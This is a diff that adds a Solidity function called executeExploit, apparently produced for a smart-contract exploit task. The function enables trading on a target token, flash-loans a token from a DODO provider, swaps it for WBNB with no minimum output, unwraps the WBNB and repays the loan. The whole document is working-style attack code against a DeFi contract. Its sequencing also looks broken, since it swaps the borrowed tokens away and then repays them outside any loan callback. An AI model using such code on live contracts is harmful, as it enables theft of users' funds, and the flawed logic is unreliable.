@@ -1,0 +1,40 @@
+```solidity
+<executeExploitCode>
+function executeExploit(uint256 amount) internal {
+    // Step 1: Contact the target FoundationToken to enable trading
+    IFoundationToken(target).enableTrading();
+
+    // Step 2: Flashloan the valuableToken from the flashloan provider
+    address[] memory tokens = new address[](1);
+    tokens[0] = address(valuableToken);
+
+    uint256[] memory amounts = new uint256[](1);
+    amounts[0] = amount;
+
+    // Step 3: Make the flashloan
+    IDODO(flashloanProvider).flashLoan(amounts[0], 0, address(this), "0x0");
+  
+    uint256 valuableBalance = valuableToken.balanceOf(address(this));
+    console.log("Gained valuable tokens:", valuableBalance);
+    
+    // Step 4: Swap the borrowed valuableToken for WBNB
+    address[] memory path = new address[](2);
+    path[0] = address(valuableToken);
+    path[1] = address(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c); // WBNB
+
+    IUniswapV2Router(uniswapRouter).swapExactTokensForETHSupportingFeeOnTransferTokens(
+        valuableBalance,
+        0, // Accept any amount of WBNB
+        path,
+        address(this),
+        block.timestamp
+    );
+
+    // Step 5: Withdraw all WBNB to the contract
+    IWBNB(weth).withdraw(IWBNB(weth).balanceOf(address(this)));
+
+    // Step 6: Repay the flashloan
+    valuableToken.transfer(flashloanProvider, amount);    
+}
+</executeExploitCode>
+```
